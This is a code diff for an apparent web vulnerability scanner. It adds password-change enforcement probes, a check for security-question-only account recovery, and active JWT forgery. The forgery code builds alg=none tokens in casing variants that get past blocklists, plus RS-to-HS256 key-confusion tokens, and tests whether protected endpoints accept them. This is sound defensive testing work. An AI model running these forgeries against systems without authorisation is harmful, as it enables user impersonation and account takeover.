@@ -14,6 +14,9 @@ from app.models.vulnerability import OwaspCategory, SeverityLevel
 
 logger = logging.getLogger(__name__)
 
+# Sentinel distinguishing "key absent" from "key present with value None".
+_MISSING = object()
+
 
 class AuthenticationFailuresDetector(BaseDetector):
     name = "authentication_failures"
@@ -800,6 +803,18 @@ class AuthenticationFailuresDetector(BaseDetector):
             current = next_value
         current[parts[-1]] = value
 
+    @staticmethod
+    def _remove_body_path(body: dict, path: str) -> bool:
+        """Delete the value at a dotted body path. Returns True if a key was removed."""
+        current = body
+        parts = path.split(".")
+        for part in parts[:-1]:
+            next_value = current.get(part)
+            if not isinstance(next_value, dict):
+                return False
+            current = next_value
+        return current.pop(parts[-1], _MISSING) is not _MISSING
+
     def _classify_api_auth_fields(self, body: dict) -> dict[str, str | None]:
         fields: dict[str, str | None] = {
             "username": None,
@@ -809,6 +824,7 @@ class AuthenticationFailuresDetector(BaseDetector):
             "confirm_password": None,
             "token": None,
             "mfa_code": None,
+            "security_answer": None,
         }
         for path, _ in self._body_paths(body):
             key = path.rsplit(".", 1)[-1].lower()
@@ -821,6 +837,7 @@ class AuthenticationFailuresDetector(BaseDetector):
                 fields["password"] = path
             elif fields["current_password"] is None and normalized in {
                 "current_password", "old_password", "existing_password",
+                "currentpassword", "oldpassword", "existingpassword",
             }:
                 fields["current_password"] = path
             elif fields["new_password"] is None and normalized in {
@@ -840,6 +857,11 @@ class AuthenticationFailuresDetector(BaseDetector):
                 "otp", "mfa", "mfa_code", "totp", "code", "verification_code", "security_code",
             }:
                 fields["mfa_code"] = path
+            elif fields["security_answer"] is None and normalized in {
+                "security_answer", "securityanswer", "secanswer", "secret_answer",
+                "recovery_answer", "answer",
+            }:
+                fields["security_answer"] = path
         return fields
 
     def _api_records(self, kwargs: dict[str, object]) -> list[dict]:
@@ -997,18 +1019,37 @@ class AuthenticationFailuresDetector(BaseDetector):
             )
             detection_method = "api_reset_token_enforcement_probe"
         elif flow_type == "password_change":
-            if not fields.get("new_password") or fields.get("current_password"):
+            if not fields.get("new_password"):
                 return []
             parameter = fields.get("new_password")
-            self._set_body_path(body, parameter, f"SentryStrikeChangeCheck{int(time.time())}!")
+            probe_password = f"SentryStrikeChangeCheck{int(time.time())}!"
+            self._set_body_path(body, parameter, probe_password)
             if fields.get("confirm_password"):
-                self._set_body_path(body, fields["confirm_password"], f"SentryStrikeChangeCheck{int(time.time())}!")
-            vuln_type = "Password Change API Missing Current Password Requirement"
-            evidence = (
-                "Authenticated password-change API body contains a new-password field but no current-password "
-                "field. A safe verification request was accepted without a current-password error."
-            )
-            detection_method = "api_password_change_current_password_probe"
+                self._set_body_path(body, fields["confirm_password"], probe_password)
+            if fields.get("current_password"):
+                # The endpoint DOES define a current-password field — actively test
+                # whether the server enforces it by OMITTING it from the request. A
+                # server that still applies the change without the current credential
+                # is exploitable for authenticated account takeover (a stolen/CSRF'd
+                # session can change the password blind). Removing a genuinely-required
+                # field yields a validation error on a correct server, so acceptance
+                # is the discriminator.
+                if not self._remove_body_path(body, fields["current_password"]):
+                    return []
+                vuln_type = "Password Change API Does Not Enforce Current Password"
+                evidence = (
+                    "Authenticated password-change API accepted a change request with the current-password "
+                    "field omitted. The server does not enforce the current credential, enabling silent "
+                    "account takeover from an active session."
+                )
+                detection_method = "api_password_change_enforcement_probe"
+            else:
+                vuln_type = "Password Change API Missing Current Password Requirement"
+                evidence = (
+                    "Authenticated password-change API body contains a new-password field but no current-password "
+                    "field. A safe verification request was accepted without a current-password error."
+                )
+                detection_method = "api_password_change_current_password_probe"
         elif flow_type == "mfa":
             if fields.get("mfa_code") or fields.get("token"):
                 return []
@@ -1087,7 +1128,60 @@ class AuthenticationFailuresDetector(BaseDetector):
                         flow_type=flow_type,
                     )
                 )
+            # Weak-recovery is a property of the fields, not the flow label: a reset
+            # endpoint that also carries a new-password field is classified as
+            # "password_change" above, so run this structural check on every record
+            # and let its own field guards scope it to genuine recovery flows.
+            findings.extend(self._security_question_recovery_findings(record))
         return findings
+
+    def _security_question_recovery_findings(self, record: dict) -> list[Finding]:
+        """Flag a password-reset flow that recovers accounts via a security question.
+
+        Structural weakness (OWASP A07): security questions are low-entropy,
+        often answerable from public/social data, and non-revocable. When a reset
+        flow sets a new password gated only on a security-answer field — with no
+        unguessable, single-use token/OTP/signed challenge — the recovery channel
+        is the weakest link. This is a design finding (the fields are observed),
+        not an exploit attempt; confidence is moderate and no answer is guessed.
+        """
+        fields = record["fields"]
+        if not fields.get("security_answer"):
+            return []
+        # Scope to a genuine RECOVERY flow (not registration, which also collects a
+        # security answer): either the body sets a new password, or the endpoint is
+        # a reset/recovery path. Both are universal recovery signals.
+        url_lower = str(record["url"]).lower()
+        is_recovery = bool(fields.get("new_password")) or self._url_contains(url_lower, self.reset_tokens)
+        if not is_recovery:
+            return []
+        # A genuine unguessable factor (token/OTP/signed challenge) alongside the
+        # security answer is defence-in-depth, not security-question-only recovery.
+        if fields.get("token") or fields.get("mfa_code"):
+            return []
+        return [
+            self._finding(
+                vuln_type="Password Reset Relies on Security Question (Weak Recovery)",
+                url=record["url"],
+                method=record["method"],
+                parameter=str(fields.get("security_answer")),
+                severity=SeverityLevel.medium,
+                evidence=(
+                    "The password-reset flow sets a new password gated only on a security-answer "
+                    "field, with no unguessable token, OTP, or signed challenge. Security questions "
+                    "are low-entropy and frequently answerable from public data, making this recovery "
+                    "channel a weak link for account takeover."
+                ),
+                verified=True,
+                detection_method="security_question_recovery_pattern",
+                confidence_score=65.0,
+                detection_evidence={
+                    "security_answer_field": fields.get("security_answer"),
+                    "new_password_field": fields.get("new_password"),
+                    "source": record["source"],
+                },
+            )
+        ]
 
     # ---------------------------------------------------------------------------
     # JWT/session token checks
@@ -1333,6 +1427,233 @@ class AuthenticationFailuresDetector(BaseDetector):
             )
         return findings
 
+    # ---------------------------------------------------------------------------
+    # Active JWT forgery
+    # ---------------------------------------------------------------------------
+
+    @staticmethod
+    def _b64url(raw: bytes) -> str:
+        return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
+
+    def _forge_alg_none(self, header: dict, payload: dict) -> list[tuple[str, str]]:
+        """Forge unsigned tokens for the payload across alg=none casing variants.
+
+        A JWT library that honours ``alg:none`` accepts a token with an empty
+        signature. Casing variants defeat naive blocklists that only reject the
+        exact lowercase string. Returns ``(label, token)`` pairs.
+        """
+        payload_segment = self._b64url(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
+        tokens: list[tuple[str, str]] = []
+        for variant in ("none", "None", "NONE", "nOnE"):
+            header_variant = {**header, "alg": variant}
+            header_segment = self._b64url(json.dumps(header_variant, separators=(",", ":")).encode("utf-8"))
+            tokens.append((f"alg={variant}", f"{header_segment}.{payload_segment}."))
+        return tokens
+
+    def _forge_key_confusion(self, header: dict, payload: dict, public_key_pem: str) -> str | None:
+        """Forge an HS256 token signed with the server's RSA public key as the HMAC secret.
+
+        Algorithm-confusion: a server that verifies with ``jwt.verify(token, publicKey)``
+        while allowing symmetric algorithms will validate an HS256 token whose MAC
+        key is the (public) PEM it also uses to verify RS256. Generic to any RSA-JWT
+        service whose public key is obtainable via standard discovery.
+        """
+        try:
+            import jwt as pyjwt  # PyJWT
+
+            new_header = {key: value for key, value in header.items() if key.lower() != "alg"}
+            return pyjwt.encode(
+                payload,
+                key=public_key_pem,
+                algorithm="HS256",
+                headers={**new_header, "alg": "HS256"},
+            )
+        except Exception:
+            return None
+
+    @staticmethod
+    def _jwks_to_pems(jwks: object) -> list[str]:
+        """Convert RSA keys in a JWKS document to PEM public keys (best-effort)."""
+        pems: list[str] = []
+        keys = jwks.get("keys", []) if isinstance(jwks, dict) else []
+        for jwk in keys if isinstance(keys, list) else []:
+            if not isinstance(jwk, dict) or jwk.get("kty") != "RSA" or "n" not in jwk or "e" not in jwk:
+                continue
+            try:
+                from cryptography.hazmat.primitives import serialization
+                from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+
+                def _int(segment: str) -> int:
+                    padded = segment + "=" * (-len(segment) % 4)
+                    return int.from_bytes(base64.urlsafe_b64decode(padded.encode("ascii")), "big")
+
+                public_key = RSAPublicNumbers(_int(jwk["e"]), _int(jwk["n"])).public_key()
+                pem = public_key.public_bytes(
+                    serialization.Encoding.PEM,
+                    serialization.PublicFormat.SubjectPublicKeyInfo,
+                ).decode("ascii")
+                pems.append(pem)
+            except Exception:
+                continue
+        return pems
+
+    async def _fetch_jwks_pems(self, kwargs: dict[str, object], verifier: object) -> list[str]:
+        """Discover RSA public keys via STANDARD JWKS endpoints only (no app paths)."""
+        root_url = str(kwargs.get("root_url") or "")
+        if not root_url:
+            return []
+        parsed = urlparse(root_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        pems: list[str] = []
+        for path in ("/.well-known/openid-configuration", "/.well-known/jwks.json"):
+            try:
+                resp = await verifier.send_request(
+                    base + path, "GET", None, None,
+                    test_phase="jwt_jwks_discovery", module="auth",
+                )
+                if not (200 <= getattr(resp, "status_code", 0) < 300):
+                    continue
+                document = json.loads(getattr(resp, "body", "") or "{}")
+            except Exception:
+                continue
+            jwks = document
+            if isinstance(document, dict) and document.get("jwks_uri"):
+                try:
+                    resp2 = await verifier.send_request(
+                        str(document["jwks_uri"]), "GET", None, None,
+                        test_phase="jwt_jwks_fetch", module="auth",
+                    )
+                    jwks = json.loads(getattr(resp2, "body", "") or "{}")
+                except Exception:
+                    continue
+            pems.extend(self._jwks_to_pems(jwks))
+        # De-duplicate while preserving order.
+        seen: set[str] = set()
+        unique: list[str] = []
+        for pem in pems:
+            if pem not in seen:
+                seen.add(pem)
+                unique.append(pem)
+        return unique
+
+    def _forgery_oracle_candidates(self, kwargs: dict[str, object]) -> list[str]:
+        """Observed bearer-authenticated GET endpoints usable as a forgery oracle."""
+        urls: list[str] = []
+        seen: set[str] = set()
+        for request in kwargs.get("requests") or []:
+            if str(getattr(request, "method", "GET") or "GET").upper() != "GET":
+                continue
+            if not self._extract_bearer(dict(getattr(request, "request_headers", {}) or {})):
+                continue
+            url = str(getattr(request, "url", "") or "")
+            if url and url not in seen:
+                seen.add(url)
+                urls.append(url)
+        return urls
+
+    @staticmethod
+    async def _send_with_bearer(verifier: object, url: str, token: str | None, *, phase: str) -> object:
+        headers = {} if token is None else {"Authorization": f"Bearer {token}"}
+        return await verifier.send_request(
+            url, "GET", None, None,
+            headers=headers, test_phase=phase, module="auth", parameter="jwt",
+        )
+
+    async def _establish_forgery_oracle(self, verifier: object, url: str, real_token: str) -> dict | None:
+        """Confirm ``url`` is bearer-protected and the real token works.
+
+        Returns the real-token success status, or ``None`` when the endpoint is not
+        a usable oracle (public, or the real token is not accepted). No session
+        cookies are sent, so authentication is attributable solely to the bearer.
+        """
+        no_auth = await self._send_with_bearer(verifier, url, None, phase="jwt_forgery_noauth")
+        real = await self._send_with_bearer(verifier, url, real_token, phase="jwt_forgery_baseline")
+        if getattr(no_auth, "not_tested", False) or getattr(real, "not_tested", False):
+            return None
+        if getattr(no_auth, "status_code", 0) not in (401, 403):
+            return None
+        if not (200 <= getattr(real, "status_code", 0) < 300):
+            return None
+        return {"real_status": getattr(real, "status_code", 0)}
+
+    async def _active_jwt_forgery_findings(
+        self,
+        kwargs: dict[str, object],
+        session_cookies: dict,
+    ) -> list[Finding]:
+        """Actively forge the scanner's own JWT and flag only if the forgery is accepted.
+
+        Upgrades passive ``alg=none``/signature notes to a VERIFIED finding: a forged
+        token that a bearer-protected endpoint accepts (where no-auth is denied and
+        the real token works) proves signature verification is broken. Idempotent
+        GET only; runs solely when an observed bearer-protected GET oracle exists, so
+        it adds near-zero cost otherwise. Session cookies are intentionally excluded
+        so acceptance is attributable to the forged token alone.
+        """
+        candidates = self._forgery_oracle_candidates(kwargs)
+        if not candidates:
+            return []
+        tokens = [item for item in self._tokens_from_context(kwargs, session_cookies) if self._decode_jwt(item["token"])]
+        if not tokens:
+            return []
+
+        from app.core.verification.verification_framework import HttpVerifier
+
+        primary = tokens[0]
+        header, payload = self._decode_jwt(primary["token"])
+        verifier = HttpVerifier()  # no cookies: bearer is the only auth factor under test
+        try:
+            for url in candidates[:2]:
+                oracle = await self._establish_forgery_oracle(verifier, url, primary["token"])
+                if oracle is None:
+                    continue
+
+                forged: list[tuple[str, str]] = list(self._forge_alg_none(header, payload))
+                if str(header.get("alg", "")).upper().startswith(("RS", "ES", "PS")):
+                    for pem in await self._fetch_jwks_pems(kwargs, verifier):
+                        confused = self._forge_key_confusion(header, payload, pem)
+                        if confused:
+                            forged.append(("algorithm confusion (RS→HS256)", confused))
+
+                for label, token in forged:
+                    resp = await self._send_with_bearer(verifier, url, token, phase="jwt_forgery_attempt")
+                    if getattr(resp, "not_tested", False):
+                        continue
+                    status = getattr(resp, "status_code", 0)
+                    if 200 <= status < 300:
+                        is_none = label.startswith("alg=")
+                        return [
+                            self._finding(
+                                vuln_type=(
+                                    "JWT alg=none Forgery Accepted" if is_none
+                                    else "JWT Algorithm-Confusion Forgery Accepted"
+                                ),
+                                url=url,
+                                severity=SeverityLevel.critical,
+                                evidence=(
+                                    f"A forged JWT ({label}) built from the scanner's own token was accepted by a "
+                                    f"bearer-protected endpoint (no-auth was denied 401/403, the real token returned "
+                                    f"{oracle['real_status']}, and the forged token returned {status}). "
+                                    "Signature verification is not enforced — any user or role can be impersonated."
+                                ),
+                                verified=True,
+                                detection_method="jwt_active_forgery",
+                                confidence_score=95.0,
+                                verification_request_snippet=getattr(resp, "request_snippet", None),
+                                verification_response_snippet=getattr(resp, "response_snippet", None),
+                                detection_evidence={
+                                    "forgery": label,
+                                    "token_source": primary.get("source"),
+                                    "oracle_url": url,
+                                    "real_status": oracle["real_status"],
+                                    "forged_status": status,
+                                },
+                            )
+                        ]
+            return []
+        finally:
+            await verifier.close()
+
     def _cookie_attribute_findings(self, kwargs: dict[str, object]) -> list[Finding]:
         findings: list[Finding] = []
         seen: set[tuple[str, str]] = set()
@@ -1469,6 +1790,7 @@ class AuthenticationFailuresDetector(BaseDetector):
     ) -> list[Finding]:
         findings = []
         findings.extend(self._jwt_findings(kwargs, session_cookies))
+        findings.extend(await self._active_jwt_forgery_findings(kwargs, session_cookies))
         findings.extend(self._cookie_attribute_findings(kwargs))
         findings.extend(await self._logout_token_reuse_findings(kwargs, session_cookies))
         return findings
